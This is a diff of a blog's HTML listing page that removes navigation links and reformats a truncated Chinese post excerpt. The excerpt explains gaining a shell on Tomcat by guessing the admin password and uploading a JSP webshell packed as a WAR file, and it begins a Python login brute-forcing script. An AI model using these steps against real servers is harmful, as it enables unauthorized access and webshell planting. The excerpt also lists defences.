@@ -53,24 +53,6 @@
     </h1>
     <ul class="nav">
         
-            
-                <li>
-                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
-            
-                </li>
-        
-            
-                <li>
-                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
-            
-                </li>
-        
-            
-                <li>
-                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
-            
-                </li>
-        
     </ul>
 </div>
 
@@ -121,7 +103,8 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 关于War包 War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布 则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat 服务器启动时,War包也会随之被解压后自动部署。 0x01 上传War包GetShell 找到后台猜密码然后登录 上传War包 先将jsp大马压缩为zip，再将zip后缀改名为war，然后上传war包 0x02漏洞防御 后台使用强密码 删除Tomcat下的manager文件夹 0x03 附爆破弱口令代码 #!/usr/bin/env python #-*- coding:utf-8 -*- import requests import json import base64 import sys import Queue import threading &quot;&quot;&quot; 简单爆破后台登陆密码 Usage: python tomcat.py username.txt password.txt urlfile.txt username.txt为用户名字典 password.txt为密码字典 urlfile.txt为后台url列表 &quot;&quot;&quot; def get_username(userfile): username = [] with open(userfile, 'r') as f: lines = f.readlines() for line in lines: username.append(line.strip()) return username def get_pwd(passfile): password = []
+        0x00 关于War包  War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布 则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat 服务器启动时,War包也会随之被解压后自动部署。   0x01 上传War包GetShell  找到后台猜密码然后登录  上传War包
+先将jsp大马压缩为zip，再将zip后缀改名为war，然后上传war包   0x02漏洞防御  后台使用强密码 删除Tomcat下的manager文件夹  0x03 附爆破弱口令代码  #!/usr/bin/env python #-*- coding:utf-8 -*- import requests import json import base64 import sys import Queue import threading &quot;&quot;&quot; 简单爆破后台登陆密码 Usage: python tomcat.py username.txt password.txt urlfile.txt username.txt为用户名字典 password.txt为密码字典 urlfile.txt为后台url列表 &quot;&quot;&quot; def get_username(userfile): username = [] with open(userfile, 'r') as f: lines = f.
     </p>
 
     
